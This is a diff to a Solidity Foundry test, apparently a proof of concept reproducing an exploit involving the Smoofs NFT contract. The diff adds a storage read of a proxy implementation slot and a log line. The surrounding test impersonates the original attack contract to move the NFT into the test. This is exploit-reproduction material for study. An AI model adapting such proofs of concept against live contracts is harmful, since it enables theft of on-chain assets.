@@ -41,6 +41,8 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        bytes32 a = vm.load(address(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C),0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
+        emit log_named_bytes32("a is :", a);
         // For the purpose of this poc transfer Smoofs NFT token from original attack contract
         vm.prank(attackContract);
         Smoofs.transferFrom(attackContract, address(this), smoofsTokenId);
